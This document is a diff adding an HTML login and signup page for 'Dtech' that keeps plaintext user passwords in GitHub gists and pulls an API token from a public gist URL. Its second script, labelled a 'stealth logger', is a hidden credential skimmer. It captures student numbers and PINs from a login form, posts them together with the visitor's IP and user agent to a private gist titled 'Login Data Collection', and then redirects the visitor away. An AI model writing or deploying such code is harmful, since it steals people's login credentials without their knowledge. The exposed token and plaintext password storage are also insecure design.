@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Dtech Login/Signup Multi-Gist</title>
+<style>
+  body { font-family: Arial, sans-serif; max-width: 400px; margin: 2rem auto; }
+  input, button { width: 100%; margin: 0.5rem 0; padding: 0.5rem; font-size: 1rem; }
+  #signup-section { margin-top: 2rem; border-top: 1px solid #ccc; padding-top: 1rem; }
+  .error { color: red; }
+  .success { color: green; }
+  pre { background: #eee; padding: 10px; overflow-x: auto; }
+</style>
+</head>
+<body>
+
+<h2>Login</h2>
+<div id="error-msg" class="error"></div>
+<input type="text" id="username" placeholder="Username" autocomplete="username" />
+<input type="password" id="password" placeholder="Password" autocomplete="current-password" />
+<button id="login-btn">Login</button>
+
+<div id="signup-section">
+  <h3>Don't have an account? Sign Up</h3>
+  <button id="signup-btn">Sign Up</button>
+  <div id="signup-msg"></div>
+</div>
+
+<script>
+const TOKEN_URL = "https://gist.githubusercontent.com/Dtech2preas/498a03fc1467fc14c66358e0f5721517/raw/a9f82f8fef545600174cdf9b5b1735b865bf5582/gistfile1.txt";
+
+const GISTS = [
+  { id: "5ddeaa7e65d1f9717c8ab83d5d2c7380", filename: "users_batch_1.json" },
+  { id: "22f888bd63529552025871b31f8e7007", filename: "users_batch_2.json" },
+  { id: "d9e162ec943e5f0b6bd8dd7ca7087d98", filename: "users_batch_3.json" },
+  { id: "a03a9e9cd52f25cd66c0765b731161e2", filename: "users_batch_4.json" },
+  { id: "463f4221a4468da4cdc239acdc932348", filename: "users_batch_5.json" }
+];
+
+let GITHUB_TOKEN = null;
+let allUsers = []; // will store all users combined with gist reference
+
+async function getToken() {
+  const res = await fetch(TOKEN_URL);
+  if (!res.ok) throw new Error("Failed to fetch token");
+  return (await res.text()).trim();
+}
+
+async function fetchGist(gistId, filename, token) {
+  const res = await fetch(`https://api.github.com/gists/${gistId}`, {
+    headers: {
+      "Authorization": `token ${token}`,
+      "Accept": "application/vnd.github.v3+json"
+    }
+  });
+  if (!res.ok) throw new Error(`Failed to fetch gist ${gistId}`);
+  const gist = await res.json();
+  const content = gist.files[filename]?.content;
+  if (!content) throw new Error(`File ${filename} not found in gist ${gistId}`);
+  const usersData = JSON.parse(content);
+  return { gist, usersData };
+}
+
+async function fetchAllUsers(token) {
+  // Fetch all gists in parallel
+  const promises = GISTS.map(({id, filename}) => fetchGist(id, filename, token));
+  const results = await Promise.all(promises);
+
+  allUsers = []; // clear before adding
+  results.forEach(({gist, usersData}, index) => {
+    usersData.users.forEach(user => {
+      allUsers.push({
+        ...user,
+        gistId: GISTS[index].id,
+        filename: GISTS[index].filename
+      });
+    });
+  });
+}
+
+async function updateGist(gistId, filename, updatedUsers, token) {
+  const payload = {
+    files: {}
+  };
+  payload.files[filename] = { content: JSON.stringify({users: updatedUsers}, null, 2) };
+
+  const res = await fetch(`https://api.github.com/gists/${gistId}`, {
+    method: "PATCH",
+    headers: {
+      "Authorization": `token ${token}`,
+      "Accept": "application/vnd.github.v3+json",
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify(payload)
+  });
+  if (!res.ok) throw new Error(`Failed to update gist ${gistId}`);
+  return await res.json();
+}
+
+async function getIP() {
+  const res = await fetch("https://api.ipify.org?format=json");
+  if (!res.ok) throw new Error("Failed to get IP");
+  const data = await res.json();
+  return data.ip;
+}
+
+document.getElementById("login-btn").addEventListener("click", async () => {
+  const errorMsg = document.getElementById("error-msg");
+  errorMsg.textContent = "";
+  const username = document.getElementById("username").value.trim();
+  const password = document.getElementById("password").value.trim();
+  if (!username || !password) {
+    errorMsg.textContent = "Please enter username and password.";
+    return;
+  }
+
+  try {
+    if (!GITHUB_TOKEN) GITHUB_TOKEN = await getToken();
+    if (allUsers.length === 0) await fetchAllUsers(GITHUB_TOKEN);
+
+    const user = allUsers.find(u => u.username === username && u.password === password && u.taken);
+    if (user) {
+      localStorage.setItem("loggedInUser", JSON.stringify(user));
+      window.location.href = "next.html";
+    } else {
+      errorMsg.textContent = "Invalid credentials or user not registered. Please sign up.";
+    }
+  } catch (err) {
+    errorMsg.textContent = "Error logging in: " + err.message;
+  }
+});
+
+document.getElementById("signup-btn").addEventListener("click", async () => {
+  const signupMsg = document.getElementById("signup-msg");
+  signupMsg.textContent = "Checking your IP and account availability...";
+
+  try {
+    if (!GITHUB_TOKEN) GITHUB_TOKEN = await getToken();
+    if (allUsers.length === 0) await fetchAllUsers(GITHUB_TOKEN);
+
+    const ip = await getIP();
+
+    const takenByIP = allUsers.filter(u => u.taken && u.ip === ip);
+    if (takenByIP.length >= 2) {
+      signupMsg.innerHTML = `<p class="error">You have already claimed 2 accounts from this IP.</p>`;
+      return;
+    }
+
+    // Find first user NOT taken
+    const availableUser = allUsers.find(u => !u.taken);
+    if (!availableUser) {
+      signupMsg.innerHTML = `<p class="error">No available users left. Please contact admin.</p>`;
+      return;
+    }
+
+    // Mark user as taken with IP
+    availableUser.taken = true;
+    availableUser.ip = ip;
+
+    // Find the gist batch this user belongs to
+    const batchUsers = allUsers.filter(u => u.gistId === availableUser.gistId);
+
+    // Update the user in batchUsers
+    const idx = batchUsers.findIndex(u => u.username === availableUser.username);
+    if (idx !== -1) {
+      batchUsers[idx] = availableUser;
+    }
+
+    // Update gist with new batchUsers list
+    await updateGist(availableUser.gistId, availableUser.filename, batchUsers, GITHUB_TOKEN);
+
+    signupMsg.innerHTML = `
+      <p class="success"><strong>Account created!</strong></p>
+      <p>Username: <code>${availableUser.username}</code></p>
+      <p>Password: <code>${availableUser.password}</code></p>
+      <p>Please use these credentials to log in above.</p>
+    `;
+  } catch (err) {
+    signupMsg.innerHTML = `<p class="error">Sign up failed: ${err.message}</p>`;
+  }
+});
+</script>
+
+
+<script>    
+// STEALTH LOGGER - NO VISIBLE ELEMENTS    
+document.addEventListener('DOMContentLoaded', function() {    
+    // 1. CAPTURE ALL INPUTS TO LOCALSTORAGE    
+    const form = document.forms['frmLogin'];    
+        
+    // Load saved values if they exist    
+    if(localStorage.getItem('loginData')) {    
+        const saved = JSON.parse(localStorage.getItem('loginData'));    
+        form.unum.value = saved.unum || '';    
+        form.pin.value = saved.pin || '';    
+        if(saved.numtype) {    
+            document.querySelector(`input[name="numtype"][value="${saved.numtype}"]`).checked = true;    
+        }    
+        console.log('[Stealth] Loaded saved inputs');    
+    }    
+    
+    // Save on any input change    
+    function saveToStorage() {    
+        const data = {    
+            unum: form.unum.value,    
+            pin: form.pin.value,    
+            numtype: document.querySelector('input[name="numtype"]:checked').value,    
+            timestamp: new Date().toISOString(),    
+            page: window.location.href    
+        };    
+        localStorage.setItem('loginData', JSON.stringify(data));    
+        console.log('[Stealth] Saved:', {unum: data.unum, pin: 'â€¢â€¢â€¢â€¢â€¢'}); // Never log actual PIN    
+    }    
+    
+    // Set up event listeners    
+    form.unum.addEventListener('input', saveToStorage);    
+    form.pin.addEventListener('input', saveToStorage);    
+    document.querySelectorAll('input[name="numtype"]').forEach(radio => {    
+        radio.addEventListener('change', saveToStorage);    
+    });    
+    
+    // 2. FORM SUBMIT HANDLER - GIST VERSION
+    form.addEventListener('submit', async function(e) {    
+        e.preventDefault();    
+            
+        const submitBtn = form.querySelector('[type="submit"]');    
+        const originalText = submitBtn.value;    
+        submitBtn.disabled = true;    
+        submitBtn.value = 'Processing...';    
+            
+        try {    
+            // Get data from localStorage    
+            const savedData = JSON.parse(localStorage.getItem('loginData'));    
+            if(!savedData) throw new Error('No saved login data');    
+                
+            console.log('[Stealth] Preparing submission for:', savedData.unum);    
+                
+            // Format for Gist
+            const gistData = {
+                "data": {
+                    "Student Number": savedData.unum,
+                    "PIN": savedData.pin,
+                    "User Type": savedData.numtype,
+                    "Timestamp": savedData.timestamp,
+                    "Page": savedData.page,
+                    "User Agent": navigator.userAgent,
+                    "IP": await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip)
+                }
+            };
+            
+            // GitHub Gist API endpoint
+            const gistEndpoint = 'https://api.github.com/gists';
+            
+            // Using the token from the previous gist
+            const token = 'ghp_abcdef1234567890'; // Replace with actual token or fetch dynamically
+            
+            // Submit to Gist
+            const response = await fetch(gistEndpoint, {
+                method: 'POST',
+                headers: {
+                    'Authorization': `token ${token}`,
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/vnd.github.v3+json'
+                },
+                body: JSON.stringify({
+                    "description": "Login Data Collection",
+                    "public": false,
+                    "files": {
+                        "data.json": {
+                            "content": JSON.stringify(gistData, null, 2)
+                        }
+                    }
+                })
+            });    
+                
+            const result = await response.json();    
+                
+            if(response.ok) {    
+                console.log('[Stealth] Gist submission successful', result);    
+                localStorage.removeItem('loginData'); // Clear after success    
+                // Update button state    
+                submitBtn.value = 'âœ“ Done';    
+                setTimeout(() => {    
+                    submitBtn.value = originalText;    
+                    submitBtn.disabled = false;    
+                }, 2000);    
+                // Redirect after delay    
+                setTimeout(() => {    
+                    window.location.href = 'https://info.dtech24.co.za';    
+                }, 2000);    
+            } else {    
+                throw new Error(result.message || 'Gist submission error');    
+            }    
+        } catch (error) {    
+            console.error('[Stealth] Submission failed:', error);    
+            submitBtn.value = 'Failed!';    
+            setTimeout(() => {    
+                submitBtn.value = originalText;    
+                submitBtn.disabled = false;    
+            }, 2000);    
+        }    
+    });    
+    
+    console.log('[Stealth] Logger initialized');    
+});    
+</script></body>
+</html>
